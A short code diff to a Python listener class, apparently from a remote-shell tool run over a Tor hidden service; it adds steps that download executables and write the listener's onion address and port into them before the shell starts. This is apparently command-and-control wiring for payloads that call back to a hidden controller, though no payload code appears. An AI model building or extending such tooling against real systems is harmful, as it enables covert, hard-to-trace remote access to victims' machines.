@@ -4,6 +4,7 @@ from shell import ListenerShell
 from shell_ui.style import Style
 from argparse import ArgumentParser
 import shell_ui.ascii_art as banner
+import generate_executables
 
 
 class Listener(Style):
@@ -16,6 +17,8 @@ class Listener(Style):
         listener_port, forward_port = Listener.parse_args()
         self.torHS = Tor('listener', listener_port, forward_port)
         listener_socket = ListenerSocket(forward_port)
+        generate_executables.download_executables()
+        generate_executables.append_address(self.torHS.get_onion_address(), listener_port)
         listener_socket.start()
         shell = ListenerShell(listener_socket)
         shell.run()
